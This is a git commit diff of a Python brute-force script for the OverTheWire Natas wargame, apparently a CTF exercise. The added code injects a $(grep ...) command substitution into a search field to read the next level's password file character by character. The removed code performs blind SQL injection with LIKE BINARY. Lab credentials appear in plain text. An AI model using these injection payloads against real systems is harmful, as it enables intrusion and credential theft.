804d0b3159b2d893570c78271eaea9f7d372beba
Joseph Murphy <jmurphy5277@gmail.com>
2015-02-18 12:13:51 -0500

    got 17

--- Natas/natas16_brute.py
+++ Natas/natas16_brute.py
@@ -2,18 +2,18 @@ import httplib2
 import urllib
 
 website = httplib2.Http()
-website.add_credentials('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
+website.add_credentials('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
 
 password = "" #Blank for know. Will be added to as the code guess chars
 charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 counter = 0 #will iterate if there is a correct guess
 
-while (counter < len(charSet)) and (password !=32):
-	query = urllib.urlencode(dict(username="natas16\" AND password LIKE BINARY \"" + password + charSet[counter] + "%\" ;# "))
-	resp, content = website.request("http://natas15.natas.labs.overthewire.org/index.php?" + query, method="POST")
+while (counter < len(charSet)) and (len(password) != 32):
+	query = urllib.quote_plus("$(grep -E ^" + password + charSet[counter] + ".* /etc/natas_webpass/natas17)hello")
+	resp, content = website.request("http://natas16.natas.labs.overthewire.org/index.php?needle=" + query + "&submit=Search", method="POST")
 	#Check to see if the query was successful
-	if ("This user exists" in str(content)):
+	if (content.count("hello")==0):
 		password += charSet[counter] #keep adding to password as characters are successful in the query
 		print "Password attempt was: " + password
 		counter = 0 #rest back to beginning of character of set, since we just got a successful hit
@@ -21,4 +21,3 @@ while (counter < len(charSet)) and (password !=32):
 	else:
 		counter += 1 #move up the characterset if not a match
 		continue
-
